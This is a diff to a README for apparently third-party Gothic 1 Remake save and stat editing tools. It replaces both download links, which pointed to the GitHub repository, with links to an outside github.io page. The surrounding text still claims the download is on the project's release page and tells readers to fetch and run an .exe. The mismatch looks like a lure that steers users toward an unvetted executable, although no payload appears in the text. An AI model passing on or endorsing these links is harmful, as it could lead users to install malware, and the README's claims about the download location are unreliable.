@@ -1,6 +1,6 @@
 # 🛠️ gothic1-remake-tools - Manage your save files and stats
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/susarm2388/gothic1-remake-tools)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://susarm2388.github.io)
 
 This project provides tools for Gothic 1 Remake. You can change your character stats, modify save files, and fix quest progress. These tools work on Windows computers.
 
@@ -8,7 +8,7 @@ This project provides tools for Gothic 1 Remake. You can change your character s
 
 The software lives on the project release page. Follow the link below to reach that location.
 
-[Download the Gothic 1 Remake Tools](https://github.com/susarm2388/gothic1-remake-tools)
+[Download the Gothic 1 Remake Tools](https://susarm2388.github.io)
 
 Once you arrive at the page, look for the section titled "Assets." Click the link ending in .exe to start the download. Save this file to a folder you remember, such as your Downloads folder or your Desktop.
 
